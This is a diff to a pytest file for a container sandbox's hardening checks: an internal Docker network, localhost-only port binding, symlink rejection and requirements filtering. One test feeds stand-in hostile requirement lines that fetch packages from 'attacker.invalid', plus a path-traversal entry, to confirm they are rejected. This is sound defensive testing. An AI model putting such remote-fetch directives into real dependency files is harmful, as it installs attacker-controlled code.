@@ -1,11 +1,15 @@
 from unittest.mock import patch, MagicMock
 from fastapi.testclient import TestClient
+import pytest
 
 from app.sandbox import (
+    copy_sandbox_requirements,
+    create_sandbox_network,
     is_docker_available,
     detect_port_from_file,
     scaffold_sandbox_context,
-    run_sandbox_container
+    run_sandbox_container,
+    validate_untrusted_tree,
 )
 
 def test_detect_port_from_file(tmp_path):
@@ -61,6 +65,7 @@ def test_scaffold_sandbox_context_custom_file(tmp_path):
     dockerfile_content = (temp_dir / "Dockerfile").read_text()
     assert "EXPOSE 4000" in dockerfile_content
     assert "USER 10001:10001" in dockerfile_content
+    assert "--only-binary=:all:" in dockerfile_content
     assert "COPY --chown=10001:10001 app.py ." in dockerfile_content
     assert "CMD [\"python\", \"app.py\"]" in dockerfile_content
 
@@ -88,6 +93,37 @@ def test_scaffold_sandbox_context_local_app(tmp_path):
     assert "COPY --chown=10001:10001 app/ app/" in dockerfile_content
     assert "CMD [\"python\", \"app/main.py\"]" in dockerfile_content
 
+
+def test_sandbox_requirements_reject_remote_and_pip_directives(tmp_path):
+    destination = tmp_path / "sandbox-requirements.txt"
+    for value in (
+        "-r https://attacker.invalid/requirements.txt\n",
+        "example @ https://attacker.invalid/package.whl\n",
+        "../local-package\n",
+    ):
+        source = tmp_path / "requirements.txt"
+        source.write_text(value)
+        try:
+            copy_sandbox_requirements(source, destination)
+        except RuntimeError as exc:
+            assert "rejected line 1" in str(exc)
+        else:
+            raise AssertionError("Unsafe sandbox requirement must be rejected")
+
+
+def test_untrusted_tree_rejects_symlinks_and_reports_workspace_size(tmp_path):
+    target = tmp_path / "target"
+    target.mkdir()
+    (target / "app.py").write_text("print('safe')\n")
+    assert validate_untrusted_tree(target) == {
+        "files": 1,
+        "bytes": (target / "app.py").stat().st_size,
+    }
+
+    (target / "escape").symlink_to(tmp_path / "outside")
+    with pytest.raises(RuntimeError, match="symbolic links"):
+        validate_untrusted_tree(target)
+
 def test_run_sandbox_container_args():
     with patch("subprocess.run") as mock_run:
         mock_result = MagicMock()
@@ -99,7 +135,8 @@ def test_run_sandbox_container_args():
             container_name="test-container",
             host_port=5002,
             container_port=5001,
-            waf_enabled=True
+            waf_enabled=True,
+            network_name="test-network",
         )
         assert success is True
         
@@ -113,6 +150,7 @@ def test_run_sandbox_container_args():
         assert "0.5" in called_args
         assert "--pids-limit" in called_args
         assert "50" in called_args
+        assert called_args.count("--ulimit") == 2
         assert "--cap-drop" in called_args
         assert "ALL" in called_args
         assert "--security-opt" in called_args
@@ -123,6 +161,17 @@ def test_run_sandbox_container_args():
         assert "--user" in called_args
         assert "10001:10001" in called_args
         assert "WAF_ENABLED=true" in called_args
+        assert "127.0.0.1:5002:5001" in called_args
+        assert called_args[called_args.index("--network") + 1] == "test-network"
+
+
+def test_create_sandbox_network_is_internal():
+    with patch("subprocess.run") as mock_run:
+        mock_run.return_value = MagicMock(returncode=0)
+        assert create_sandbox_network("test-network") is True
+        assert mock_run.call_args[0][0] == [
+            "docker", "network", "create", "--internal", "test-network"
+        ]
 
 def test_run_scan_simulated_fallback():
     # Test main fastapi app routing when docker is down
